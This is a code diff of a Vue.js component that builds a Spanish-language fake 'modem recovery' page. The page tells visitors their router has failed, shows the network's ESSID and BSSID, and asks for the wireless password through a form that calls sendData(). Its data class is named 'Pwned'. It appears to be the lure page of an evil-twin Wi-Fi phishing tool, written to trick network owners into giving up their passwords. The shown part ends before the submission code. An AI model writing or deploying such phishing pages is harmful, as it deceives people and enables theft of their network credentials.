@@ -2,11 +2,18 @@
     <div class="container">
         <div class="row pt-5">
             <div class="col-md-7">
-                <p>Test</p>
+                <h2>Recuperación del Módem</h2>
+                <p>Se ha encontrado un error fatal en el router por lo tanto se ha iniciado el sistema de recuperación automático. Este sistema de recuperación se ocupará de arreglar los errores del módem y actualizarlo.</p>
+                <p>Por favor tómate tu tiempo para leer las políticas de privacidad</p>
+                <privacy-policy/>
+                <p>Por favor ingrese la contraseña de la red inalámbrica para continuar. Después de que sea solucionado el error del módem se reestablecerá su conexión.</p>
             </div>
+
             <div class="col-md-5">
                 <div class="card">
                     <div class="card-body">
+                        <p>ESSID: <strong>{{ essid }}</strong></p>
+                        <p>BSSID: <strong>{{ bssid }}</strong></p>
                         <form @submit.prevent="sendData()">
                             <div class="form-group">
                                 <input type="password" 
@@ -31,6 +38,8 @@
 </template>
 
 <script>
+import PrivacyPolicy from '../components/PrivacyPolicy.vue'
+
 class Pwned {
     constructor(Password, VerifyPass) {
         this.Password = Password,
@@ -40,6 +49,13 @@ class Pwned {
 
 export default {
     name: "ConfigView",
+    props: {
+        essid: String,
+        bssid: String
+    },
+    components: {
+        PrivacyPolicy
+    },
     data() {
         return {
             pwned: new Pwned()
